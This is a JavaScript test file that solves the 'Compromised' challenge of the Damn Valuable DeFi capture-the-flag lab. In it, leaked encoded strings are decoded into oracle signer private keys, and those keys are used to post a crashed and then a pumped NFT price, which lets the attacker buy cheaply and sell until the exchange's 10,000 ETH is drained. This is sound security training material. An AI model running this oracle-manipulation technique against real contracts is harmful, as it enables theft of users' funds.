const { ether, balance } = require("@openzeppelin/test-helpers");
const { accounts, contract, web3 } = require("@openzeppelin/test-environment");

const Exchange = contract.fromArtifact("Exchange");
const DamnValuableNFT = contract.fromArtifact("DamnValuableNFT");
const TrustfulOracle = contract.fromArtifact("TrustfulOracle");
const TrustfulOracleInitializer = contract.fromArtifact(
  "TrustfulOracleInitializer"
);

const { expect } = require("chai");

describe("Compromised challenge", function () {
  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];

  const [deployer, attacker] = accounts;
  const EXCHANGE_INITIAL_ETH_BALANCE = ether("10000");
  const INITIAL_NFT_PRICE = ether("999");

  before(async function () {
    /** SETUP - NO NEED TO CHANGE ANYTHING HERE */

    // Fund the trusted source addresses
    await web3.eth.sendTransaction({
      from: deployer,
      to: sources[0],
      value: ether("5"),
    });
    await web3.eth.sendTransaction({
      from: deployer,
      to: sources[1],
      value: ether("5"),
    });
    await web3.eth.sendTransaction({
      from: deployer,
      to: sources[2],
      value: ether("5"),
    });

    // Deploy the oracle and setup the trusted sources with initial prices
    this.oracle = await TrustfulOracle.at(
      await (
        await TrustfulOracleInitializer.new(
          sources,
          ["DVNFT", "DVNFT", "DVNFT"],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE],
          { from: deployer }
        )
      ).oracle()
    );

    // Deploy the exchange and get the associated ERC721 token
    this.exchange = await Exchange.new(this.oracle.address, {
      from: deployer,
      value: EXCHANGE_INITIAL_ETH_BALANCE,
    });
    this.token = await DamnValuableNFT.at(await this.exchange.token());
  });

  it("Exploit", async function () {
    /** YOUR EXPLOIT GOES HERE */
    const parsedFirstEncodedSource =
      "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35"
        .split(" ")
        .join("");
    const parsedSecondEncodedSource =
      "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
        .split(" ")
        .join("");
    const firstSource = web3.eth.accounts.privateKeyToAccount(
      Buffer.from(
        Buffer.from(parsedFirstEncodedSource, "hex").toString("utf-8"),
        "base64"
      ).toString("utf-8")
    );
    const secondSource = web3.eth.accounts.privateKeyToAccount(
      Buffer.from(
        Buffer.from(parsedSecondEncodedSource, "hex").toString("utf-8"),
        "base64"
      ).toString("utf-8")
    );
    web3.eth.accounts.wallet.add(firstSource.address);
    web3.eth.accounts.wallet.add(secondSource.address);

    console.log(`firstSource ${firstSource.address}`);
    console.log(`secondSource ${secondSource.address}`);
    const medianPriceBefore = await this.oracle.getMedianPrice("DVNFT");
    console.log(`medianPriceBefore: ${medianPriceBefore.toString()}`);

    const encodedPostPrice = await web3.eth.abi.encodeFunctionCall(
      {
        inputs: [
          {
            internalType: "string",
            name: "symbol",
            type: "string",
          },
          {
            internalType: "uint256",
            name: "newPrice",
            type: "uint256",
          },
        ],
        name: "postPrice",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
      },
      ["DVNFT", "1"]
    );
    const firstSourceSigned = await web3.eth.accounts.signTransaction(
      {
        from: firstSource.address,
        to: this.oracle.address,
        data: encodedPostPrice,
        gas: 2100000,
      },
      firstSource.privateKey
    );
    const secondSourceSigned = await web3.eth.accounts.signTransaction(
      {
        from: secondSource.address,
        to: this.oracle.address,
        data: encodedPostPrice,
        gas: 2100000,
      },
      secondSource.privateKey
    );
    await web3.eth.sendSignedTransaction(firstSourceSigned.rawTransaction);
    await web3.eth.sendSignedTransaction(secondSourceSigned.rawTransaction);

    const medianPriceAfter = await this.oracle.getMedianPrice("DVNFT");
    console.log(`medianPriceAfter: ${medianPriceAfter.toString()}`);

    const attackerNftBalanceBefore = await this.token.balanceOf(attacker);
    console.log(
      `attackerNftBalanceBefore: ${attackerNftBalanceBefore.toString()}`
    );
    const tx = await this.exchange.buyOne({
      value: 1,
      from: attacker,
    });

    const tokenId = tx.logs[0].args.tokenId.toString();
    console.log(`tokenId: ${tokenId.toString()}`);
    const attackerNftBalanceAfter = await this.token.balanceOf(attacker);
    console.log(
      `attackerNftBalanceAfter: ${attackerNftBalanceAfter.toString()}`
    );
    const contractEtherBalanceBefore = await web3.eth.getBalance(
      this.exchange.address
    );
    console.log(
      `contractEtherBalanceBefore: ${contractEtherBalanceBefore.toString()}`
    );
    const encodedPostPricePump = await web3.eth.abi.encodeFunctionCall(
      {
        inputs: [
          {
            internalType: "string",
            name: "symbol",
            type: "string",
          },
          {
            internalType: "uint256",
            name: "newPrice",
            type: "uint256",
          },
        ],
        name: "postPrice",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
      },
      ["DVNFT", contractEtherBalanceBefore.toString()]
    );
    const firstSourceSignedPump = await web3.eth.accounts.signTransaction(
      {
        from: firstSource.address,
        to: this.oracle.address,
        data: encodedPostPricePump,
        gas: 2100000,
      },
      firstSource.privateKey
    );
    const secondSourceSignedPump = await web3.eth.accounts.signTransaction(
      {
        from: secondSource.address,
        to: this.oracle.address,
        data: encodedPostPricePump,
        gas: 2100000,
      },
      secondSource.privateKey
    );
    await web3.eth.sendSignedTransaction(firstSourceSignedPump.rawTransaction);
    await web3.eth.sendSignedTransaction(secondSourceSignedPump.rawTransaction);
    const medianPriceAfterSecondManipulation = await this.oracle.getMedianPrice(
      "DVNFT"
    );
    console.log(
      `medianPriceAfterSecondManipulation: ${medianPriceAfterSecondManipulation.toString()}`
    );
    await this.token.approve(this.exchange.address, tokenId, {
      from: attacker,
    });
    await this.exchange.sellOne(tokenId, { from: attacker });
  });

  after(async function () {
    // Exchange must have lost all ETH
    expect(await balance.current(this.exchange.address)).to.be.bignumber.eq(
      "0"
    );
    expect(await balance.current(attacker)).to.be.bignumber.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );
  });
});
